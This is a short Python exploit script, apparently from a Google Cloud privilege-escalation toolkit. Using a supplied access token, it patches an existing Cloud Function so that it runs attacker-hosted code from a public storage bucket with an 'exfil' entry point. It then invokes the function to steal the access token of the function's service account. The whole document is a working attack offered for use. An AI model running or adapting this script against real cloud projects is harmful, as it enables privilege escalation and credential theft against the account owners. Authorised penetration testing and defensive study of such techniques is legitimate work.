#!/usr/bin/env python3

# A Google Storage link to the code to upload to the target Cloud Function
# The included function will return the access token of the associated Service Account when executed
# Upload ./ExploitScripts/CloudFunctions/cloudfunctions.functions.create.zip to a Google Storage bucket in your own account, make it public, then put the link here
CODE_ZIP_SRC = 'gs://some-public-bucket/cloudfunctions.functions.create.zip'

PROJECT_ID = ''
FUNCTION_NAME = ''
LOCATION = 'us-central1'
ACCESS_TOKEN = input('Enter an access token to use for authentication: ').rstrip()

from apiclient.discovery import build
import google.oauth2.credentials
import time, json

credentials = google.oauth2.credentials.Credentials(ACCESS_TOKEN)
service = build(serviceName='cloudfunctions', version='v1', credentials=credentials)

body = {
    'sourceArchiveUrl': CODE_ZIP_SRC,
    'entryPoint': 'exfil'
}

res = service.projects().locations().functions().patch(name=f'projects/{PROJECT_ID}/locations/{LOCATION}/functions/{FUNCTION_NAME}', updateMask='sourceArchiveUrl,entryPoint', body=body).execute()

print(json.dumps(res, indent=4))

print('Waiting 2 minutes to call the function...')
time.sleep(120)

res = service.projects().locations().functions().call(name=f'projects/{PROJECT_ID}/locations/{LOCATION}/functions/{FUNCTION_NAME}', body={'data': 'none'}).execute()

res['result'] = json.loads(res['result'])

print(json.dumps(res, indent=4))
